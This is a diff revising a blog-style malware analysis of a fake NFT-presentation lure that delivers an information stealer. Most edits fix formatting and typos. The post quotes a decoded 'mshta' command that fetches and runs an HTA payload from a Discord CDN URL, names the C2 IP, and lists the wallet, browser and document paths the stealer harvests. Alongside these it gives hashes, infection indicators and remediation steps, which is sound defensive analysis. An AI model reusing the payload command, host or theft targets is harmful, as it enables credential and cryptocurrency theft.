@@ -23,7 +23,7 @@ Some key aspects are available here:
 
 The archive initially shared with the victim is password protected. The following table shows its details:
 
-| *Type*     | *data*|
+| *Type*     | *Data*|
 | :---       |    :---|
 | Name       | Presentation for artist Wargaming NFT.rar| 
 | MD5        | 7b26b892c3e8e053f56f00c0df0614c9|
@@ -40,7 +40,7 @@ The file `Wargaming_nft_presentation_for_artist - www.clound.com`, despite its n
 
 The file's details are shown in the table below.
 
-| *Type*     | *data*|
+| *Type*     | *Data*|
 | :---       |    :---|
 | Name       | Wargaming_nft_presentation_for_artist - www.clound.com| 
 | MD5        | c9b92bc28fb1339eb450ff2061760352|
@@ -55,9 +55,9 @@ It downloads a file with `.png` extension from Discord, reverses it and treats i
 
 ![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/NFT/images/dll.png)<br />
 
-That is an MZ header, and this is a Portable Executable (PE). The file is a DLL written in dotNET, and this time obfuscated, named `Szclhysb.dll`. The following table shows its details.
+That is a reversed MZ header, and this is a Portable Executable (PE). The file is a DLL written in dotNET, and this time obfuscated, named `Szclhysb.dll`. The following table shows its details.
 
-| *Type*     | *data*|
+| *Type*     | *Data*|
 | :---       |    :---|
 | Name       | Szclhysb.dll| 
 | MD5        | dee66f52d1ded3e7d0c8e6e27441d7f4|
@@ -79,7 +79,7 @@ There is no need to go as far as analysing the shortcut with forensic tools: a s
 
 The three LNKs are actually the same file with different filenames, as they share the same hash. Their details are visible in the table below.
 
-| *Type*     | *data*|
+| *Type*     | *Data*|
 | :---       |    :---|
 | Name       | sketch_nn_wot_tank_1/2/3.png| 
 | MD5        | 0af5392da151a262a9249bd03c5d8748|
@@ -90,13 +90,13 @@ The Powershell script contains two arrays that are turned into characters by the
 
 ![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/NFT/images/powershell_shortcut.png)<br />
 
-The smaller one (`$ac`) translates to `IEX`, while the other (`$es`) is `mshta https://cdn.discordapp.com/attachments/930485322846986240/930495210625064990/pngsuka.hta`. So, the script downloads and executes an HTA application. `pngsuka.hta` contains obfuscated VBScript, and it's around 600 lines long. Much like the initial PowerShell, this VBScript translates a long array into characters and executes it. The result is yet more obfuscated PowerShell, that aims at downloading, saving and executing a PE file from a Discord CDN. The function responsible for downloading and executing the file is displayed in the following image.
+The smaller one (`$ac`) translates to `IEX`, while the other (`$es`) to `mshta https://cdn.discordapp.com/attachments/930485322846986240/930495210625064990/pngsuka.hta`. So, the script downloads and executes an HTA application. `pngsuka.hta` contains obfuscated VBScript, and it's around 600 lines long. Much like the initial PowerShell, this VBScript translates a long array into characters and executes it. The result is yet more obfuscated PowerShell, that aims at downloading, saving to `%appdata%` and executing a PE file from a Discord CDN. The function responsible for downloading and executing the file is displayed in the following image.
 
 ![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/NFT/images/powershell.png)<br />
 
 The resulting binary (`PNGBLYAT.exe`) is also an obfuscated dotNET PE (details in the table below). Its infection logic is the same as `Szclhysb.dll`, and will be presented in the next paragraph.
 
-| *Type*     | *data*|
+| *Type*     | *Data*|
 | :---       |    :---|
 | Name       | PNGBLYAT.exe| 
 | MD5        | c43f329192fb3dd114c1149086c16f5f|
@@ -115,11 +115,9 @@ The final payload is an information stealer that contacts the Threat Actor's Com
 
 The data the malware looks for can be separated into three categories:
 
-i) all the files with extension `.txt`, `.key`, `.wallet`, `.seed` located in `%userprofile%\Desktop` and `%userprofile%\Documents`.
-
-ii) all the files in the folder `%USERPROFILE%\AppData\Local\$name\User Data` and `%USERPROFILE%\AppData\Roaming\$name`, where `$name` indicates browsers (such as Chromium, YandexBrowser, Vivaldi,...) and other programs (such as NVIDIA GeForce Experience, Steam and Thunderbird).
-
-iii) cryptocurrency wallets (e.g., Electrum, Exodus, Atomic,...).
+* all the files with extension `.txt`, `.key`, `.wallet`, `.seed` located in `%userprofile%\Desktop` and `%userprofile%\Documents`.
+* all the files in the folder `%USERPROFILE%\AppData\Local\$name\User Data` and `%USERPROFILE%\AppData\Roaming\$name`, where `$name` indicates browsers (such as Chromium, YandexBrowser, Vivaldi,...) and other programs (such as NVIDIA GeForce Experience, Steam and Thunderbird).
+* cryptocurrency wallets (e.g., Electrum, Exodus, Atomic,...).
 
 In essence, the Threat Actor is stealing credentials, cookies, documents, licenses, and many more from infected PCs.
 
@@ -127,15 +125,14 @@ In essence, the Threat Actor is stealing credentials, cookies, documents, licens
 
 Look in the following paths:
 
--`\Microsoft\Windows\Start Menu\Programs\` for a folder named `mplayer` with an executable named `mplayer.exe`
+* `\Microsoft\Windows\Start Menu\Programs\` for a folder named `mplayer` with an executable named `mplayer.exe`
+* `%temp%` for an executable file more than 500Mb in size named something like `Wargaming_nft_presentation_for_artist - www.clound.com`
 
--`%temp%` for an executable file more than 500Mb in size named something like `Wargaming_nft_presentation_for_artist - www.clound.com`
-
-If you have matching files in these locations, it means you were infected. In case you have network logs, look for communication with the IP `185.215.113.15` on port `8080`.
+If you have matching files in these locations, it means you were infected. In case you have network logs, look for communication with the IP `185.215.113.15` on port `8080`. If you have any kind of traffic to the IP, it means you were infected.
 
 ### What can I do?
 
 First, calm.
 
-Then, change all the passwords for all the accounts you have, and enable MFA oon everywhere you can. Try as much as you can to find evidence of intrusion in your accounts: you may have received a warning email, or even some notifications in the app. If you suspect that someone might have accessed your accounts, contact the platform's support. Delete the above mentioned files and run an Antivirus scan.
+Then, change all the passwords for all the accounts you have, and enable MFA on everywhere you can. Try as much as you can to find evidence of intrusion in your accounts: you may have received a warning email, or even some notifications in the app. If you suspect that someone might have accessed your accounts, contact the platform's support. Delete the above mentioned files and run an Antivirus scan.
 
